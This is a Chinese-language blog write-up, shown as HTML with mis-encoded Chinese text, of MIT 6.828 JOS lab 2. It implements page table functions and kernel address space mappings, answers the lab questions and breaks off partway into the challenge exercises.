href="#page-lookup-ï¼šè¿”å›è™šæ‹Ÿåœ°å€å¯¹åº”-PageInfo-åœ°å€" class="headerlink" title="page_lookup()ï¼šè¿”å›è™šæ‹Ÿåœ°å€å¯¹åº” PageInfo åœ°å€"></a>page_lookup()ï¼šè¿”å›è™šæ‹Ÿåœ°å€å¯¹åº” PageInfo åœ°å€</h4><p>ä¸»è¦æ˜¯è®©æˆ‘ä»¬æŸ¥æ‰¾é¡µè¡¨ï¼Œè¿”å›è™šæ‹Ÿåœ°å€å¯¹åº”çš„ PageInfo</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Return the page mapped at virtual address &#x27;va&#x27;.</span></span><br><span class="line"><span class="comment">// If pte_store is not zero, then we store in it the address</span></span><br><span class="line"><span class="comment">// of the pte for this page.  This is used by page_remove and</span></span><br><span class="line"><span class="comment">// can be used to verify page permissions for syscall arguments,</span></span><br><span class="line"><span class="comment">// but should not be used by most callers.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Return NULL if there is no page mapped at va.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Hint: the TA solution uses pgdir_walk and pa2page.</span></span><br><span class="line"><span class="comment">//</span></span><br></pre></td></tr></table></figure><p>ç›´æ¥ç”¨å‰é¢å†™çš„ <code>pgdir_walk()</code> æ‰¾åˆ°é¡µè¡¨é¡¹å†ç”¨ <code>pa2page()</code> æŠŠç‰©ç†åœ°å€è½¬æˆ PageInfo çš„è™šæ‹Ÿåœ°å€å³å¯ï¼ŒJOS è¿˜æä¾›äº†ä¸€ä¸ªæ–¹ä¾¿çš„é¡µè¡¨é¡¹åˆ°ç‰©ç†åœ°å€è½¬åŒ–çš„å® <code>PTE_ADDR()</code> ï¼ˆä¸€å¼€å§‹ç¬”è€…éƒ½æ˜¯çº¯æ‰‹å†™â€¦ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> PageInfo *</span><br><span class="line"><span class="title function_">page_lookup</span><span class="params">(<span class="type">pde_t</span> *pgdir, <span class="type">void</span> *va, <span class="type">pte_t</span> **pte_store)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Fill this function in</span></span><br><span class="line"></span><br><span class="line"><span class="type">pte_t</span> *pte;</span><br><span class="line"></span><br><span class="line">pte = pgdir_walk(pgdir, va, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pte_store)</span><br><span class="line">*pte_store = pte;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// page not present</span></span><br><span class="line"><span class="keyword">if</span> (!pte || !((*pte) &amp; PTE_P))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> pa2page(PTE_ADDR(*pte));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="page-remove-ï¼šè§£é™¤é¡µè¡¨è™šæ‹Ÿåœ°å€æ˜ å°„"><a href="#page-remove-ï¼šè§£é™¤é¡µè¡¨è™šæ‹Ÿåœ°å€æ˜ å°„" class="headerlink" title="page_remove()ï¼šè§£é™¤é¡µè¡¨è™šæ‹Ÿåœ°å€æ˜ å°„"></a>page_remove()ï¼šè§£é™¤é¡µè¡¨è™šæ‹Ÿåœ°å€æ˜ å°„</h4><p>ä¸»è¦æ˜¯è§£é™¤é¡µè¡¨ä¸Šå¯¹åº”è™šæ‹Ÿåœ°å€åˆ°ç‰©ç†åœ°å€é—´çš„æ˜ å°„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Unmaps the physical page at virtual address &#x27;va&#x27;.</span></span><br><span class="line"><span class="comment">// If there is no physical page at that address, silently does nothing.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Details:</span></span><br><span class="line"><span class="comment">//   - The ref count on the physical page should decrement.</span></span><br><span class="line"><span class="comment">//   - The physical page should be freed if the refcount reaches 0.</span></span><br><span class="line"><span class="comment">//   - The pg table entry corresponding to &#x27;va&#x27; should be set to 0.</span></span><br><span class="line"><span class="comment">//     (if such a PTE exists)</span></span><br><span class="line"><span class="comment">//   - The TLB must be invalidated if you remove an entry from</span></span><br><span class="line"><span class="comment">//     the page table.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Hint: The TA solution is implemented using page_lookup,</span></span><br><span class="line"><span class="comment">// tlb_invalidate, and page_decref.</span></span><br><span class="line"><span class="comment">//</span></span><br></pre></td></tr></table></figure><p>æ¸…ç©ºé¡µè¡¨é¡¹å¹¶å‡å°‘å¼•ç”¨è®¡æ•°å³å¯ï¼Œè‹¥å¼•ç”¨è®¡æ•°ä¸º 0 åˆ™é‡Šæ”¾è¯¥é¡µï¼Œåˆ«å¿˜äº†ä½¿ç”¨ <code>tlb_invalidate()</code> æ¸…é™¤ TLB ä¸­ç¼“å­˜</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">page_remove</span><span class="params">(<span class="type">pde_t</span> *pgdir, <span class="type">void</span> *va)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Fill this function in</span></span><br><span class="line"></span><br><span class="line"><span class="type">pte_t</span> *pte;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">pp</span>;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">// get the PageInfo and PTE</span></span><br><span class="line">pp = page_lookup(pgdir, va, &amp;pte);</span><br><span class="line"><span class="keyword">if</span> (pp)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// clear PTE</span></span><br><span class="line">tlb_invalidate(pgdir, va);</span><br><span class="line">*pte = (<span class="type">pte_t</span>) <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// decrease refcount</span></span><br><span class="line">page_decref(pp);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="page-insert-ï¼šå»ºç«‹è™šæ‹Ÿåœ°å€åˆ°ç‰©ç†é¡µæ˜ å°„"><a href="#page-insert-ï¼šå»ºç«‹è™šæ‹Ÿåœ°å€åˆ°ç‰©ç†é¡µæ˜ å°„" class="headerlink" title="page_insert()ï¼šå»ºç«‹è™šæ‹Ÿåœ°å€åˆ°ç‰©ç†é¡µæ˜ å°„"></a>page_insert()ï¼šå»ºç«‹è™šæ‹Ÿåœ°å€åˆ°ç‰©ç†é¡µæ˜ å°„</h4><p>å»ºç«‹å•ä¸ªè™šæ‹Ÿåœ°å€åˆ°å•å¼ ç‰©ç†é¡µä¸Šçš„æ˜ å°„ï¼Œåˆ†é…å¹¶å¢åŠ é¡µå¼•ç”¨è®¡æ•°ï¼Œè‹¥å·²æœ‰ä¸€ä¸ªæ˜ å°„åˆ™ç§»é™¤ç°æœ‰æ˜ å°„å¹¶æ¸…ç©º TLB å¯¹åº”æ¡ç›®</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Map the physical page &#x27;pp&#x27; at virtual address &#x27;va&#x27;.</span></span><br><span class="line"><span class="comment">// The permissions (the low 12 bits) of the page table entry</span></span><br><span class="line"><span class="comment">// should be set to &#x27;perm|PTE_P&#x27;.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Requirements</span></span><br><span class="line"><span class="comment">//   - If there is already a page mapped at &#x27;va&#x27;, it should be page_remove()d.</span></span><br><span class="line"><span class="comment">//   - If necessary, on demand, a page table should be allocated and inserted</span></span><br><span class="line"><span class="comment">//     into &#x27;pgdir&#x27;.</span></span><br><span class="line"><span class="comment">//   - pp-&gt;pp_ref should be incremented if the insertion succeeds.</span></span><br><span class="line"><span class="comment">//   - The TLB must be invalidated if a page was formerly present at &#x27;va&#x27;.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Corner-case hint: Make sure to consider what happens when the same</span></span><br><span class="line"><span class="comment">// pp is re-inserted at the same virtual address in the same pgdir.</span></span><br><span class="line"><span class="comment">// However, try not to distinguish this case in your code, as this</span></span><br><span class="line"><span class="comment">// frequently leads to subtle bugs; there&#x27;s an elegant way to handle</span></span><br><span class="line"><span class="comment">// everything in one code path.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// RETURNS:</span></span><br><span class="line"><span class="comment">//   0 on success</span></span><br><span class="line"><span class="comment">//   -E_NO_MEM, if page table couldn&#x27;t be allocated</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Hint: The TA solution is implemented using pgdir_walk, page_remove,</span></span><br><span class="line"><span class="comment">// and page2pa.</span></span><br><span class="line"><span class="comment">//</span></span><br></pre></td></tr></table></figure><p>å®˜æ–¹æ¨èç”¨ <code>page_remove()</code> å®Œæˆå¯¹ç°æœ‰é¡µçš„è§£å¼•ç”¨ï¼Œä½†æ˜¯ä¼šé‡å¤è°ƒç”¨ <code>pgdir_walk()</code>ï¼Œæ‰€ä»¥ç¬”è€…ç›´æ¥å±•å¼€æ“ä½œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">page_insert</span><span class="params">(<span class="type">pde_t</span> *pgdir, <span class="keyword">struct</span> PageInfo *pp, <span class="type">void</span> *va, <span class="type">int</span> perm)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Fill this function in</span></span><br><span class="line"><span class="type">pte_t</span> *pte;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">old_pp</span>;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">// get pte of va, create it if not exist</span></span><br><span class="line">pte = pgdir_walk(pgdir, va, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (!pte)</span><br><span class="line"><span class="keyword">return</span> -E_NO_MEM;</span><br><span class="line"></span><br><span class="line"><span class="comment">// page already present, dereference it</span></span><br><span class="line"><span class="keyword">if</span> ((*pte) &amp; PTE_P)</span><br><span class="line">&#123;</span><br><span class="line">old_pp = pa2page(PTE_ADDR(*pte));</span><br><span class="line"></span><br><span class="line"><span class="comment">// if insert the same, just set the perm and return</span></span><br><span class="line"><span class="keyword">if</span> (old_pp == pp)</span><br><span class="line">&#123;</span><br><span class="line">*pte = page2pa(pp) | perm | PTE_P;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// clear PTE</span></span><br><span class="line">tlb_invalidate(pgdir, va);</span><br><span class="line">*pte = (<span class="type">pte_t</span>) <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// decrease refcount</span></span><br><span class="line">page_decref(old_pp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pp-&gt;pp_ref++;</span><br><span class="line">*pte = page2pa(pp) | perm | PTE_P;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ°è¿™é‡Œæ—¶è¿è¡Œ lab2 çš„åˆ†æ•°æ£€æŸ¥ç¨‹åºåº”è¯¥æœ‰ 40 åˆ†äº†</p><h2 id="Part-3-Kernel-Address-Space"><a href="#Part-3-Kernel-Address-Space" class="headerlink" title="Part 3: Kernel Address Space"></a>Part 3: Kernel Address Space</h2><p>kernel å æ®é«˜ 256MBçš„è™šæ‹Ÿåœ°å€ç©ºé—´è€Œ user ä½¿ç”¨å‰©ä½™çš„è™šæ‹Ÿåœ°å€ç©ºé—´</p><h3 id="Permissions-and-Fault-Isolation"><a href="#Permissions-and-Fault-Isolation" class="headerlink" title="Permissions and Fault Isolation"></a>Permissions and Fault Isolation</h3><p>å› ä¸ºä¸€å¼ é¡µç›®å½•è¡¨åŒæ—¶æ˜ å°„äº†ç”¨æˆ·ç©ºé—´ä¸å†…æ ¸ç©ºé—´ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦é€šè¿‡é¡µè¡¨ä¸­çš„æƒé™ä½é™åˆ¶ç”¨æˆ·å¯¹ä¸€äº›åœ°å€ç©ºé—´çš„è®¿é—®ï¼š</p><ul><li>å¯¹äº <code>ULIM</code> å¾€é«˜åœ°å€çš„å†…å­˜ï¼Œç”¨æˆ·æ— æƒè®¿é—®</li><li>å¯¹äº <code>[UTOP, ULIM)</code> è¿™å—åŒºåŸŸçš„å†…å­˜ï¼Œç”¨æˆ·ä¸å†…æ ¸éƒ½<strong>åªæœ‰åªè¯»æƒé™</strong>ï¼Œè¿™å—åŒºåŸŸçš„æ˜ å°„å°†é¡µè¡¨ã€PageInfo æ•°ç»„ç­‰ç»“æ„æš´éœ²ç»™ç”¨æˆ·ï¼Œä½†åªæœ‰ä½äºå†…æ ¸ç©ºé—´çš„æ˜ å°„å¯ä»¥å†™å…¥é¡µè¡¨ä¸ PageInfo æ•°ç»„</li></ul><h3 id="Initializing-the-Kernel-Address-Space"><a href="#Initializing-the-Kernel-Address-Space" class="headerlink" title="Initializing the Kernel Address Space"></a>Initializing the Kernel Address Space</h3><p>æ¥ä¸‹æ¥æ˜¯ Exercise 5ï¼šå®Œæˆ <code>mem_init()</code> çš„å‰©ä½™éƒ¨åˆ†</p><blockquote><p><strong>Exercise 5.</strong> Fill in the missing code in <code>mem_init()</code> after the call to <code>check_page()</code>.</p><p>Your code should now pass the <code>check_kern_pgdir()</code> and <code>check_page_installed_pgdir()</code> checks.</p></blockquote><h4 id="mem-init-ï¼šï¼ˆpart2ï¼‰"><a href="#mem-init-ï¼šï¼ˆpart2ï¼‰" class="headerlink" title="mem_init()ï¼šï¼ˆpart2ï¼‰"></a>mem_init()ï¼šï¼ˆpart2ï¼‰</h4><p>ç›®å…‰æ”¾å› <code>mem_init()</code>ï¼Œæ¥ä¸‹æ¥åˆåˆ°äº†è¯¥æˆ‘ä»¬è¡¥å…¨çš„åœ°æ–¹ï¼šå°† pages æ˜ å°„åˆ°çº¿æ€§åœ°å€ <code>UPAGES</code> ä¸Šï¼Œæ–°å»ºæ˜ å°„çš„æƒé™åº”ä¸ºç”¨æˆ·ä¸å†…æ ¸éƒ½å¯è¯»ï¼Œä½† pages ç»“æ„ä½“åº”å½“ä¸ºå†…æ ¸å¯è¯»å†™è€Œç”¨æˆ·ä¸å¯çŸ¥ï¼Œå› æ­¤åº”å½“å»ºç«‹æ–°çš„æ˜ å°„ï¼Œè¿™é‡Œè¯¥ç”¨ä¸Šæˆ‘ä»¬ä¹‹å‰å†™çš„ <code>boot_map_region()</code> äº†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// Now we set up virtual memory</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// Map &#x27;pages&#x27; read-only by the user at linear address UPAGES</span></span><br><span class="line"><span class="comment">// Permissions:</span></span><br><span class="line"><span class="comment">//    - the new image at UPAGES -- kernel R, user R</span></span><br><span class="line"><span class="comment">//      (ie. perm = PTE_U | PTE_P)</span></span><br><span class="line"><span class="comment">//    - pages itself -- kernel RW, user NONE</span></span><br><span class="line"><span class="comment">// Your code goes here:</span></span><br><span class="line">boot_map_region(kern_pgdir, UPAGES, </span><br><span class="line">ROUNDUP(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> PageInfo) * npages, PGSIZE), PADDR(pages), </span><br><span class="line">PTE_U);</span><br></pre></td></tr></table></figure><p>ç„¶ååˆ°åˆå§‹åŒ–å†…æ ¸æ ˆäº†ï¼Œè¿™é‡Œå†…æ ¸æ ˆè¢«åˆ†ä¸ºä¸¤å—ï¼š</p><ul><li>å¸¸è§„çš„å¯è¯»å†™å†…æ ¸æ ˆ</li><li>å†…æ ¸æ ˆä¿æŠ¤é¡µé¢ï¼Œè¯»å†™åˆ°è¯¥é¡µé¢ä¸Šæ—¶è¯´æ˜æ ˆçˆ†äº†ï¼Œç§°ä¸º guard page</li></ul><p>guard page ä¸éœ€è¦æˆ‘ä»¬å»ºç«‹æ–°çš„æ˜ å°„ï¼Œå› ä¸ºå¦‚æœçˆ†æ ˆäº†è¯»å†™åˆ° guard page è‡ªç„¶ä¼šè§¦å‘ page faultï¼Œè¿™æ—¶æˆ‘ä»¬ä¾¿çŸ¥é“çˆ†æ ˆäº†</p><p>éœ€è¦æ³¨æ„å†…æ ¸æ ˆåº”ä»…ä¸ºå†…æ ¸å¯è¯»å†™ï¼Œåº”è®¾ç½®é¡µè¡¨é¡¹çš„ Supervisor æƒé™ä½ï¼Œå³ä¸ä½¿ç”¨ <code>PTE_U</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// Use the physical memory that &#x27;bootstack&#x27; refers to as the kernel</span></span><br><span class="line"><span class="comment">// stack.  The kernel stack grows down from virtual address KSTACKTOP.</span></span><br><span class="line"><span class="comment">// We consider the entire range from [KSTACKTOP-PTSIZE, KSTACKTOP)</span></span><br><span class="line"><span class="comment">// to be the kernel stack, but break this into two pieces:</span></span><br><span class="line"><span class="comment">//     * [KSTACKTOP-KSTKSIZE, KSTACKTOP) -- backed by physical memory</span></span><br><span class="line"><span class="comment">//     * [KSTACKTOP-PTSIZE, KSTACKTOP-KSTKSIZE) -- not backed; so if</span></span><br><span class="line"><span class="comment">//       the kernel overflows its stack, it will fault rather than</span></span><br><span class="line"><span class="comment">//       overwrite memory.  Known as a &quot;guard page&quot;.</span></span><br><span class="line"><span class="comment">//     Permissions: kernel RW, user NONE</span></span><br><span class="line"><span class="comment">// Your code goes here:</span></span><br><span class="line">boot_map_region(kern_pgdir, KSTACKTOP - KSTKSIZE, KSTKSIZE, </span><br><span class="line">PADDR(bootstack), PTE_W);</span><br></pre></td></tr></table></figure><p>æœ€åæ˜¯å»ºç«‹å†…æ ¸ç©ºé—´çš„æ˜ å°„ï¼Œå°†é«˜è™šæ‹Ÿåœ°å€å¤„çš„å†…æ ¸æ˜ å°„åˆ°ç‰©ç†åœ°å€èµ·å§‹å¤„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// Map all of physical memory at KERNBASE.</span></span><br><span class="line"><span class="comment">// Ie.  the VA range [KERNBASE, 2^32) should map to</span></span><br><span class="line"><span class="comment">//      the PA range [0, 2^32 - KERNBASE)</span></span><br><span class="line"><span class="comment">// We might not have 2^32 - KERNBASE bytes of physical memory, but</span></span><br><span class="line"><span class="comment">// we just set up the mapping anyway.</span></span><br><span class="line"><span class="comment">// Permissions: kernel RW, user NONE</span></span><br><span class="line"><span class="comment">// Your code goes here:</span></span><br><span class="line">boot_map_region(kern_pgdir, KERNBASE,</span><br><span class="line">ROUNDUP(<span class="number">0xffffffff</span> - KERNBASE, PGSIZE), </span><br><span class="line"><span class="number">0</span>, PTE_W);</span><br></pre></td></tr></table></figure><p>å®Œæˆè¿™ä¸€åˆ‡ä¹‹åè¿è¡Œåˆ†æ•°åˆ¤æ–­ç¨‹åºï¼Œå…¨éƒ¨é€šè¿‡ï¼Œè‡³æ­¤ï¼Œlab2 çš„æ‰€æœ‰ç¼–ç¨‹ç»ƒä¹ å®Œç¾é€šè¿‡</p><p><img src="https://s2.loli.net/2022/03/15/IGJUqd92siweVzg.png" alt="image.png"></p><p>ä¸‹é¢æ˜¯ä¹ é¢˜ Time</p><blockquote><p><strong>Question</strong></p><ol><li><p>What entries (rows) in the page directory have been filled in at this point? What addresses do they map and where do they point? In other words, fill out this table as much as possible:</p><table><thead><tr><th>Entry</th><th>Base Virtual Address</th><th>Points to (logically):</th></tr></thead><tbody><tr><td>1023</td><td>?</td><td>Page table for top 4MB of phys memory</td></tr><tr><td>1022</td><td>?</td><td>?</td></tr><tr><td>.</td><td>?</td><td>?</td></tr><tr><td>.</td><td>?</td><td>?</td></tr><tr><td>.</td><td>?</td><td>?</td></tr><tr><td>2</td><td>0x00800000</td><td>?</td></tr><tr><td>1</td><td>0x00400000</td><td>?</td></tr><tr><td>0</td><td>0x00000000</td><td>[see next question]</td></tr></tbody></table><p><del>ç ´é¢˜ğŸ•éƒ½ä¸åš</del></p></li><li><p>We have placed the kernel and user environment in the same address space. Why will user programs not be able to read or write the kernelâ€™s memory? What specific mechanisms protect the kernel memory?</p><p>ç”±äºé¡µè¡¨é¡¹ç›¸å…³æƒé™ä½çš„å­˜åœ¨ï¼Œå¯¼è‡´ç”¨æˆ·è¿›ç¨‹ï¼ˆè¿è¡Œåœ¨ ring3ï¼‰æ— æ³•è¯»å†™å†…æ ¸çš„å†…å­˜ç©ºé—´ï¼Œå†…å­˜åˆ†é¡µæœºåˆ¶ä¿æŠ¤äº†å†…æ ¸å†…å­˜</p></li><li><p>What is the maximum amount of physical memory that this operating system can support? Why?</p><p>æ“ä½œç³»ç»Ÿæœ€å¤§å¯æ”¯æŒçš„ç‰©ç†å†…å­˜åº”å½“ä¸º 4GBï¼Œè¿™æ˜¯ä¸€ä¸ª 32 ä½é•¿åº¦çš„åœ°å€èƒ½å¤Ÿè¡¨ç¤ºçš„èŒƒå›´ä¸Šé™</p></li><li><p>How much space overhead is there for managing memory, if we actually had the maximum amount of physical memory? How is this overhead broken down?</p><p><del>çœ‹ä¸æ‡‚é¢˜ç›®ï¼Œæ‘¸äº†ï¼</del>å¯¹äºé¡µè¡¨ç»“æ„è€Œè¨€ï¼Œä¸€ä¸ªäºŒçº§é¡µè¡¨åˆšå¥½èƒ½æ»¡è½½ 4GB ç©ºé—´ï¼Œéœ€è¦ä¸€å¼ é¡µç›®å½•è¡¨ä¸ 1024 å¼ é¡µè¡¨ï¼Œæ€»è®¡ <code>4198400</code> å­—èŠ‚ç©ºé—´ï¼›å¯¹äº PageInfo ç»“æ„ä½“æ•°ç»„è€Œè¨€ï¼Œä¸€ä¸ª PageInfo ç»“æ„ä½“å ç”¨çš„ç©ºé—´ä¸º 8 å­—èŠ‚ï¼ˆ4 å­—èŠ‚å¯¹é½ï¼‰ï¼Œé‚£ä¹ˆè¦ç®¡ç† 4GB çš„ç©ºé—´æ€»è®¡éœ€è¦ <code>1048576</code> ä¸ª PageInfo ç»“æ„ä½“ï¼Œå æ® <code>8388608</code> å­—èŠ‚çš„ç©ºé—´ï¼›ä¸¤è€…æ€»è®¡æ¶ˆè€— 0.29% çš„å†…å­˜ç©ºé—´ï¼Œç¬”è€…è®¤ä¸ºè¿™ä¸ªå¼€é”€è¿˜æ˜¯æŒºå°çš„</p></li><li><p>Revisit the page table setup in <code>kern/entry.S</code> and <code>kern/entrypgdir.c</code>. Immediately after we turn on paging, EIP is still a low number (a little over 1MB). At what point do we transition to running at an EIP above KERNBASE? What makes it possible for us to continue executing at a low EIP between when we enable paging and when we begin running at an EIP above KERNBASE? Why is this transition necessary?</p><p>å› ä¸ºåœ¨å¯ç”¨åˆ†é¡µä¹‹åä½ 1MB çš„çº¿æ€§ç©ºé—´ä»ç„¶æ˜ å°„åˆ°ä½ 1MB çš„ç‰©ç†ç©ºé—´ï¼Œå› æ­¤æ­¤æ—¶ä»èƒ½æ­£å¸¸è¿è¡Œï¼›åœ¨ <code>call i386_init</code> æ—¶è·³è½¬åˆ° <code>kern/init.c</code> ä¸­çš„ <code>i386_init()</code> å‡½æ•°ï¼Œæ­¤æ—¶ eip ä¾¿ä½äºå†…æ ¸è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­äº†ï¼›åœ¨é¡µè¡¨ä¸­å»ºç«‹åŒé‡æ˜ å°„ï¼›å› ä¸ºåœ¨å¼€å¯åˆ†é¡µä¹‹å eip æš‚æ—¶è¿˜è¿è¡Œåœ¨ä½åœ°å€ç©ºé—´ï¼Œå› æ­¤è¦å…ˆæœ‰ä¸ªä¸´æ—¶çš„åŒé‡æ˜ å°„ä¿è¯è¿›å…¥å†…æ ¸è™šæ‹Ÿåœ°å€ç©ºé—´ä¹‹å‰çš„æ­£å¸¸è¿è¡Œ</p></li></ol></blockquote><p>æ¥ä¸‹æ¥æ˜¯é€‰åšéƒ¨åˆ†ï¼šMIT 6.828 çš„ Challenge</p><blockquote><p><em>Challenge!</em> We consumed many physical pages to hold the page tables for the KERNBASE mapping. Do a more space-efficient job using the PTE_PS (â€œPage Sizeâ€) bit in the page directory entries. This bit was <em>not</em> supported in the original 80386, but is supported on more recent x86 processors. You will therefore have to refer to <a href="https://pdos.csail.mit.edu/6.828/2018/readings/ia32/IA32-3A.pdf">Volume 3 of the current Intel manuals</a>. Make sure you design the kernel to use this optimization only on processors that support it!</p></blockquote><p>è¿™ä¸ª challenge çš„æ„æ€å¤§æ¦‚å°±æ˜¯å¼€å¯ 4MB çš„å¤§é¡µï¼Œè¿™é¦–å…ˆéœ€è¦æˆ‘ä»¬ä¿®æ”¹ Cr4 å¯„å­˜å™¨ï¼Œè®¾ç½® <strong>Page-Size Extensions</strong> æ ‡å¿—ä½ä¸º 1 åå†…å­˜é¡µçš„å¤§å°å°±ä» 4KB å˜æˆäº† 4MBï¼Œè¿˜éœ€è¦è®¾ç½®é¡µè¡¨é¡¹çš„ <code>PTE_PS</code> ä½ï¼Œä¸»è¦éƒ½æ˜¯è‹¦åŠ›æ´»è¿™é‡Œå°±å…ˆæ‘¸äº†ï¼ˆ</p><p>ä¸‹ä¸€ä¸ª Challengeï¼Œæ–°å¢ä¸€ä¸ª <code>showmappings</code> å‘½ä»¤ï¼š</p><blockquote><p><em>Challenge!</em> Extend the JOS kernel monitor with commands to:</p><ul><li>Display in a useful and easy-to-read 